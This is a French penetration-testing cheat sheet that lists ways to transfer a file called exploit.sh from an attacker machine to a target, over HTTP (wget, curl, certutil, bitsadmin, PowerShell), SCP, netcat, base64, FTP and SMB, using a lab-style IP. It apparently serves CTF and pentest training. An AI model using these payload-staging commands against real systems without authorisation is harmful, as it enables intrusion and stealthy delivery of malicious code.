📋 Méthodes de Transfert Disponibles

🌐

Serveur HTTP

Méthode la plus simple et universelle

Recommandé Facile
1

🖥️ Sur votre machine attaquant

Démarrez un serveur HTTP dans le dossier contenant votre fichier

Python 3 (recommandé)
python3 -m http.server 8000 --bind 0.0.0.0
Python 2 (legacy)
python -m SimpleHTTPServer 8000
PHP
php -S 0.0.0.0:8000
Ruby
ruby -run -e httpd . -p 8000
Node.js
npx http-server -p 8000 --host 0.0.0.0
2

🎯 Sur la machine cible

Téléchargez le fichier depuis votre serveur HTTP

wget (Linux/macOS)
wget "http://10.10.14.1:8000/exploit.sh" -O "/tmp/exploit.sh"
curl (Linux/macOS)
curl -o "/tmp/exploit.sh" "http://10.10.14.1:8000/exploit.sh"
PowerShell (Windows)
Invoke-WebRequest -Uri "http://10.10.14.1:8000/exploit.sh" -OutFile "C:\temp\exploit.sh"
certutil (Windows)
certutil -urlcache -split -f "http://10.10.14.1:8000/exploit.sh" "C:\temp\exploit.sh"
bitsadmin (Windows)
bitsadmin /transfer myDownloadJob /download /priority normal "http://10.10.14.1:8000/exploit.sh" "C:\temp\exploit.sh"
🔐

SCP/SFTP

Transfert sécurisé via SSH

Sécurisé SSH Auth requise
1

🖥️ Depuis votre machine attaquant

Copiez directement le fichier via SCP (nécessite SSH activé sur la cible)

SCP vers la cible
scp "exploit.sh" user@target_ip:"/tmp/exploit.sh"
SCP avec port personnalisé
scp -P 2222 "exploit.sh" user@target_ip:"/tmp/exploit.sh"
SFTP interactif
sftp user@target_ip
💡 Note : Remplacez "user" et "target_ip" par les vraies valeurs. SSH doit être activé sur la cible.
🔌

Netcat

Transfert direct via TCP

Rapide Réseau
1

🎯 Sur la machine cible (récepteur)

Démarrez netcat en mode écoute pour recevoir le fichier

Netcat récepteur
nc -l -p 8000 > "/tmp/exploit.sh"
2

🖥️ Sur votre machine attaquant (envoyeur)

Envoyez le fichier vers la cible

Netcat envoyeur
nc target_ip 8000 < "exploit.sh"
Avec timeout
timeout 30 nc target_ip 8000 < "exploit.sh"
📝

Base64

Transfert via copier-coller de texte

Manuel Discret
1

🖥️ Sur votre machine attaquant

Encodez le fichier en base64

Encoder en base64 (Linux/macOS)
base64 -w 0 "exploit.sh"
Encoder en base64 (Windows)
certutil -encode "exploit.sh" encoded.txt
2

🎯 Sur la machine cible

Décodez et sauvegardez le fichier

Décoder base64 (Linux/macOS)
echo "BASE64_STRING" | base64 -d > "/tmp/exploit.sh"
Décoder base64 (Windows)
certutil -decode encoded.txt "C:\temp\exploit.sh"
📁

Serveur FTP

Transfert via protocole FTP

Réseau Auth optionnelle
1

🖥️ Sur votre machine attaquant

Démarrez un serveur FTP

Python FTP Server
python3 -m pyftpdlib -p 21 -w
FTP avec authentification
python3 -m pyftpdlib -p 21 -u user -P pass
2

🎯 Sur la machine cible

Téléchargez le fichier via FTP

FTP client (Linux)
wget ftp://10.10.14.1/exploit.sh -O "/tmp/exploit.sh"
FTP client (Windows)
powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.1/exploit.sh', 'C:\temp\exploit.sh')"
🗂️

Partage SMB

Transfert via partage réseau Windows

Windows Réseau
1

🖥️ Sur votre machine attaquant

Créez un partage SMB

Impacket SMB Server
impacket-smbserver share . -smb2support
SMB avec authentification
impacket-smbserver share . -smb2support -user user -password pass
2

🎯 Sur la machine cible Windows

Accédez au partage et copiez le fichier

Copie depuis SMB
copy "\\10.10.14.1\share\exploit.sh" "C:\temp\exploit.sh"
Robocopy (plus robuste)
robocopy "\\10.10.14.1\share" "C:\temp" "exploit.sh"
